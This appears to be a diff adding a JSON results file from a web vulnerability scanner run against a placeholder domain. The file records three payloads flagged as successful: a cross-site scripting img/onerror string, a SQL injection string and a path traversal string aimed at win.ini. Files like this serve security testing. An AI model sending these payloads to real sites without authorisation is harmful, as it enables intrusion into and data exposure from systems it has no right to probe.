@@ -1,0 +1,27 @@
+{
+  "target": "https://example.com",
+  "timestamp": "2025-05-15 21:04:15",
+  "results": [
+    {
+      "payload": "'><img src=x onerror=alert(1)>",
+      "success": true,
+      "signature": {
+        "vector": "XSS"
+      }
+    },
+    {
+      "payload": "\" OR \"\" = \"",
+      "success": true,
+      "signature": {
+        "vector": "unknown"
+      }
+    },
+    {
+      "payload": "../../../../windows/win.ini",
+      "success": true,
+      "signature": {
+        "vector": "unknown"
+      }
+    }
+  ]
+}
